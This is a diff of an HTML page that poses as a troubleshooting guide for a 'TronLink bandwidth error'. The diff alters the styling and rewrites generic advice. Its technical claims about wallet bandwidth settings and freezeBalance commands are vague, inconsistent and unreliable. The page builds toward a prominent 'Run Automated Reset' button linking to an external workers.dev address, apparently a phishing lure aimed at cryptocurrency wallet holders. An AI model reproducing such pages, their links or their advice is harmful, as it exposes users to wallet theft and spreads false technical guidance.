@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Tronlink Bandwidth Error</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
-        background: #0a0c10;
+        font-family: -apple-system;
+        background: #121214;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff7b2c; }
     .btn {
-        background: #00adb5;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,28 +41,28 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter a "TronLink bandwidth error" when attempting to perform transactions or interact with the TRON network through TronLink, a popular wallet and browser extension.</li>
+<li>Users encounter a "TronLink bandwidth error" when attempting to perform transactions or interact with smart contracts on the TRON network, resulting in failed transactions and an inability to execute desired actions.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to insufficient bandwidth or energy on the TRON network, which is required to process transactions and execute smart contracts. This can be caused by a variety of factors, including high network congestion, insufficient TRX holdings, or incorrect configuration of bandwidth and energy settings.</li>
+<li>The error occurs due to insufficient bandwidth or energy on the user's TRON account, which is required to process transactions and execute smart contracts on the network. This can happen when a user has not acquired enough TRX (TRON's native cryptocurrency) to freeze for bandwidth or has not properly configured their account for bandwidth allocation.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the bandwidth and energy limits in the TronLink settings to allocate more resources for transaction processing.</li>
-<li>Use the TRON command-line interface to manually override bandwidth settings with the following command:</li>
+<li>Increase the account's TRX holdings to freeze for bandwidth allocation.</li>
+<li>Adjust the bandwidth allocation settings in the TronLink wallet to optimize resource usage.</li>
+<li>Utilize the following command to manually adjust bandwidth parameters:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tronweb.transactionBuilder.freezeBalance<span class="o">(</span><span class="s1">&#39;TRX&#39;</span>,<span class="w"> </span><span class="m">10000</span><span class="o">)</span>
+<div class="codehilite"><pre><span></span><code>tronweb.tx.freezeBalance<span class="o">(</span>tronweb.toSun<span class="o">(</span><span class="m">10</span><span class="o">)</span>,<span class="w"> </span><span class="m">3</span><span class="o">)</span>
 </code></pre></div>
 
+<p>Consider accessing the TRON network through an alternative interface for more direct control over transaction parameters.</p>
+<h2>Prerequisites</h2>
 <ul>
-<li>Verify that the TRX balance is sufficient to cover the required bandwidth and energy costs for the desired transactions.</li>
+<li>A basic understanding of the TRON network and its resource allocation system.</li>
+<li>A TronLink wallet with a minimum amount of TRX for bandwidth allocation.</li>
+<li>Familiarity with transaction processing on the TRON blockchain.</li>
 </ul>
-<p>Prerequisites:
-* TRX balance greater than 0
-* TronLink wallet installed and configured
-* TRON network connection established</p>
-<p>For advanced troubleshooting, consider using an external console to execute complex commands and diagnose network issues.</p>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
 </div>
